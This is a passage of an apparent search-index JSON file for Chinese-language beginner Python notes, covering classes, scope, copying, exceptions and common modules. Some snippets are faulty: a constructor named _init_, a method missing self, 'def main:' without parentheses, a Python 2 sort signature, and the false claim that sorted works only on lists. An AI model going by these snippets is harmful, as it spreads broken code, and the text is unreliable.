<p>\u200b\u200b</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_6","title":"\u8fd0\u7b97\u4f18\u5148\u987a\u5e8f","text":"<p>\u200b\u200b</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#part7","title":"Part7 \u9762\u5411\u5bf9\u8c61","text":"<p>\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50</p> <pre><code>class people(object):\n    def _init_(self, name, age):\n        self.name = name\n        self.age = age\n\n    def show_name():\n        print(self.name)\n</code></pre> <p>\u5728python\u4e2d\u8981\u9650\u5236\u51fd\u6570\u548c\u53d8\u91cf\u7684\u8bbf\u95ee\uff08\u53ea\u533a\u5206\u516c\u6709\u548c\u79c1\u6709\uff09\uff0c\u5c31\u9650\u5236\u53d8\u91cf\u51fd\u6570\u540d\u79f0\uff0c\u5728\u524d\u9762\u52a0\u4e0a\u4e0b\u5212\u7ebf\u4f8b\u5982\uff08 '_name' ), \u5219\u4e3a\u79c1\u6709\u6210\u5458\uff0c\u5176\u4f59\u5747\u4e3a\u516c\u6709\u6210\u5458</p> <pre><code>def main:\n    one = people(\"hello\", 20)\n</code></pre> <p>@property \u88c5\u9970\u5668\uff0c\u6765\u5b9a\u4e49\u8bbf\u95ee\u5668\u548c\u4fee\u6539\u5668</p> <pre><code>    @property\n    def name(self):\n        return self._name\n\n    # \u8bbf\u95ee\u5668 - getter\u65b9\u6cd5\n    @property\n    def age(self):\n        return self._age\n\n    # \u4fee\u6539\u5668 - setter\u65b9\u6cd5\n    @age.setter\n    def age(self, age):\n        self._age = age\n</code></pre> <p>@staticmethod \u5b9a\u4e49\u9759\u6001\u65b9\u6cd5\uff0c\u53ef\u4ee5\u901a\u8fc7<code>objectName.methodName</code>\u200b\u200b \u76f4\u63a5\u8c03\u7528</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_7","title":"\u547d\u540d\u7a7a\u95f4\u548c\u4f5c\u7528\u57df","text":"<p>Python\u5bf9\u4e8e\u4e00\u4e2a\u4ee3\u7801\u5757\u6709\u4e09\u4e2a\u547d\u540d\u7a7a\u95f4</p> <ul> <li>\u5c40\u90e8+\u5168\u5c40+\u5185\u7f6e</li> </ul> <p>\u5b9a\u4e49\u5728\u51fd\u6570\u5916\u7684\u90fd\u662f\u5168\u5c40\u53d8\u91cf</p> <pre><code>def selSort():\n    print(b)\nb = 1\nselSort() \u8f93\u51fa1\n</code></pre> <p>\u5982\u679c\u9700\u8981\u5728\u51fd\u6570\u5185\u663e\u793a\u5730\u4f7f\u7528\u5168\u5c40\u53d8\u91cf\uff0c\u9700\u8981\u7528global\u5173\u952e\u8bcd\uff0c\u4e0d\u7136\u7cfb\u7edf\u4f1a\u8ba4\u4e3a\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\uff0cglobal\u5c31\u662f\u505a\u4e00\u4e2a\u58f0\u660e\uff0c<code>global b = 2</code>\u200b\u662f\u9519\u7684</p> <pre><code>def selSort():\n    b = 2 \n    #global b \n    #b = 2\n    print(b)\nb = 1\nprint(b) 1\nselSort() 2\nprint(b) 1 \u53ef\u4ee5\u53d1\u73b0\u6ca1\u6709\u5f71\u54cd\u5230\u5916\u9762\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#or","title":"\u62f7\u8d1d or \u5f15\u7528","text":"<p>python\u5bf9\u6574\u6570\u53d8\u91cf\u4fee\u6539\u4f1a\u6539\u53d8\u5185\u5b58\u5730\u5740\uff0c\u6240\u4ee5id()\u51fd\u6570\u7684\u8fd4\u56de\u503c\u4f1a\u6539\u53d8</p> <p>\u62f7\u8d1d\u548c\u79fb\u52a8\u662f\u6bcf\u4e00\u4e2a\u7f16\u7a0b\u8bed\u8a00\u90fd\u8981\u5904\u7406\u7684\u95ee\u9898\uff0c\u5c24\u5176\u662f\u5b58\u5728\u590d\u6742\u5185\u5b58\u6a21\u578b\u7684\u8bed\u8a00</p> <ul> <li>\u8d4b\u503c</li> <li>\u6d45\u62f7\u8d1d \u5355\u7eaf\u62f7\u8d1d\u4e00\u5c42</li> <li>\u6df1\u62f7\u8d1d</li> </ul> <pre><code>import copy\na = {1:2}\nb = copy.copy(a)\nc = copy.deepcopy(a)\nd = a\n</code></pre> <p>\u5728python\u4e2d\uff0c\u5bf9\u4e8e\u5217\u8868\u7684\u7b80\u5355\u4e58\u6cd5\uff0c\u5bfc\u81f4\u7684\u7ed3\u679c\u662f\u521b\u5efa\u51e0\u4e2a\u770b\u4f3c\u72ec\u7acb\uff0c\u4f46\u662f\u5171\u7528\u76f8\u540c\u5185\u5b58\u7684\u5217\u8868</p> <p>\u200b\u200b</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_8","title":"\u8bed\u53e5","text":"<p>\u2018\\\u2019\u662f\u7eed\u884c\u7b26</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_9","title":"\u5f02\u5e38\u5904\u7406","text":"<pre><code>try:\n    \u4ee3\u7801\u5757\nexcept ValueError:\n    ...\nexcept ZeroDivisionError:\n    ...\nprint(\"end\")\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_10","title":"\u5e38\u7528\u7684\u5e93","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_11","title":"\u5e38\u89c1\u7684\u65b9\u6cd5","text":"<ul> <li>\u200b<code>sum()</code>\u200bsum\u7528\u6765\u505alist\u7684\u76f8\u52a0</li> <li>\u200b<code>id()</code>\u200b \u67e5\u770b\u5730\u5740\uff0c\u5bf9\u4e8e\u53ef\u53d8\u53d8\u91cf\uff0c\u53d8\u4e86id\u4e5f\u4e0d\u53d8\uff1b\u5bf9\u4e8e\u4e0d\u53ef\u53d8\u53d8\u4e86\uff0c\u53d8\u91cfid\u4e5f\u53d8</li> <li>\u200b<code>abs()</code>\u200b \u6c42\u7edd\u5bf9\u503c\uff0c\u5982\u679c\u5bf9\u4e8e\u590d\u6570\uff0c\u5c31\u662f\u6c42\u957f\u5ea6 <code>abs(3+4j)==5.0</code>\u200b</li> <li>\u200b<code>map(lamdba,)</code>\u200b</li> <li>\u200b<code>eval</code>\u200b</li> <li>\u200b<code>exec(\"print(1)\")</code>\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> </ul>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#math","title":"math","text":"<p>sqrt\u51fd\u6570\u8f93\u51fa\u662f\u6d6e\u70b9\u6570\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u8981\u5e26\u4e00\u4f4d\u5c0f\u6570</p> <pre><code>import math   \nfrom math import sqrt\nprint(math.sqrt(5))\nprint(sqrt(5))\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#dis","title":"dis","text":"<p>dis\u53cd\u6c47\u7f16\u67e5\u8be2</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#random","title":"random","text":"<ul> <li>shuffle() \u6253\u4e71\u5217\u8868\u7684\u987a\u5e8f\uff0c\u662f\u76f4\u63a5\u5728\u539f\u5217\u8868\u4e0a\u6253\u4e71\uff0c\u8fd4\u56de\u503c\u662fNone</li> <li>random \u751f\u62100.0\u52301.0 \u5de6\u95ed\u53f3\u5f00</li> <li>uniform \u95ed\u5408</li> <li>randint \u95ed\u5408</li> <li>randrange</li> </ul> <p>\u200b\u200b</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#sort-sorted","title":"sort \u548c sorted","text":"<p>sort\u662flist\u7684\u65b9\u6cd5</p> <pre><code>list.sort(cmp=None, key=None, reverse=False)\n</code></pre> <p>sorted\u4e5f\u53ea\u80fd\u5bf9list\uff0c\u56e0\u6b64\u5bf9\u4e8e\u5b57\u5178\u5bf9\u8c61\uff0c\u9700\u8981\u5148\u8c03\u7528.items()\uff0c\u5f53\u7136\u8fd4\u56de\u7684\u7ed3\u679c\u4e5f\u662f\u5217\u8868\uff0c\u7136\u540e\u5185\u90e8\u5143\u7d20\u662f\u5143\u7ec4</p> <pre><code>d1 = sorted(d1.items(),key=lambda x : ord(x[0]) if type(x[0]) == str else x[0])\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#ast","title":"ast","text":"<p>\u901a\u8fc7\u5b57\u7b26\u4e32\u8f6c\u6362\u5217\u8868\u548c\u5b57\u5178\u7684\u65b9\u6cd5</p> <pre><code>temp = ast.literal_eval(input())\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_12","title":"\u6587\u4ef6\u8bfb\u5199\u548c\u5f02\u5e38\u5904\u7406","text":"<p>\u8ba1\u7b97\u673a\u6587\u4ef6\u53ef\u5206\u4e3a\u4e8c\u79cd\uff1a \u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u6587\u672c\u6587\u4ef6</p> <p>\u56fe\u5f62\u6587\u4ef6\u53ca\u6587\u5b57\u5904\u7406\u7a0b\u5e8f\u7b49\u8ba1\u7b97\u673a\u7a0b\u5e8f\u90fd\u5c5e\u4e8e\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u542b\u6709\u7279\u6b8a\u7684\u683c\u5f0f\u53ca\u8ba1\u7b97\u673a\u4ee3\u7801\u3002</p> <p>\u6587\u672c\u6587\u4ef6\u5219\u662f\u53ef\u4ee5\u7528\u6587\u5b57\u5904\u7406\u7a0b\u5e8f\u9605\u8bfb\u7684\u7b80\u5355\u6587\u672c\u6587\u4ef6\u3002</p> <pre><code>fileobj = open(name, mode, encoding=\"\")\n</code></pre> <p>\u6587\u4ef6\u6253\u5f00\u6a21\u5f0f\u6709</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_13","title":"\u5f02\u5e38\u5904\u7406","text":"<pre><code>short_list = [1, 72, 3]\nposition = 6\ntry:\n    short_list[position]\nexcept:\n    print('\u7d22\u5f15\u5e94\u8be5\u5728 0 \u548c', len(short_list)-1,\"\u4e4b\u95f4,\u4f46\u5374\u662f\",position)\n</code></pre> <p>\u4e00\u822c\u6709\u591a\u4e2aexcept\uff0c\u5e76\u4e14except\u540e\u9762\u52a0\u4e0a\u5f02\u5e38\u7c7b\u578b</p> <p>\u200b\u200b</p> <p>raise\u8bed\u53e5\uff0c\u4e5f\u5c31\u662f\u7c7b\u4f3cthrow\u8bed\u53e5\uff0c\u8ba9\u6211\u4eec\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38</p> <p>assert\u8bed\u53e5 \u65ad\u8a00\uff0c\u5e76\u4e14\u7ed9\u5f02\u5e38\u6355\u83b7\u8bed\u53e5\u4f20\u4fe1\u606f</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/python%20%E5%85%A5%E9%97%A8/python%20%E5%85%A5%E9%97%A8/#_14","title":"\u9519\u9898","text":"<ul> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>round(-100, 00023456, 3)\u7684\u7ed3\u679c\u662f-100.0\uff0c\u5c0f\u6570\u70b9\u4f4d\u6570n\u4ee3\u8868\u662f\u6839\u636e\u5c0f\u6570\u70b9\u540e\u7b2c\u51e0\u4f4d\u6765\u56db\u820d\u4e94\u5165\uff0c\u5982\u679c\u662f0\u5c31\u4fdd\u7559\u4e00\u4e2a\uff0c\u5e76\u4e0d\u662f\u4fdd\u7559\u51e0\u4f4d\u5c0f\u6570\u7684\u610f\u601d   \u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200b\u200b</li> <li>\u200d</li> </ul> <p>\u200d</p>"}]}